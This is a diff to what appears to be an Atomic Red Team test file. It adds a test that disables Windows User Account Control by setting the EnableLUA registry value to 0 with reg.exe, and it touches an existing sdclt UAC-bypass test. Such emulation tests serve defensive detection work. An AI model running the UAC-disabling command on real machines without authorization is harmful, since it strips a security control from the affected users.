@@ -128,7 +128,7 @@ atomic_tests:
 - name: Bypass UAC using sdclt DelegateExecute
   auto_generated_guid: 3be891eb-4608-4173-87e8-78b494c029b7
   description: |
-    Bypasses User Account Control using a fileless method, registry only. 
+    Bypasses User Account Control using a fileless method, registry only.
     Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
     [Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
     Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)
@@ -148,3 +148,17 @@ atomic_tests:
     cleanup_command: |
       Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
     name: powershell
+- name: Disable UAC using reg.exe
+  auto_generated_guid: 9e8af564-53ec-407e-aaa8-3cb20c3af7f9
+  description: |
+    Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key
+    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+    cleanup_command: |
+      reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+    name: command_prompt
+    elevation_required: true
